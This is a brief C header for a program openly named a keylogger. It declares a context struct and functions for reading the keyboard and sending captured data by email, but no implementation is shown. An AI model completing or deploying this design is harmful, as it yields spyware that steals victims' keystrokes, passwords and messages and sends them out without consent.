#ifndef Keylogger_H_SENTRY
#define Keylogger_H_SENTRY

typedef struct {
    KeyboardHandler keyboard_handler;
    FileHandler file_handler;
    EmailSender sender;
    int fd;
} HandlerContext;

void *read_keyboard(void *arg);
void *send_email(void *arg);
int context_init(HandlerContext *context);
void context_cleanup(HandlerContext *context);


#endif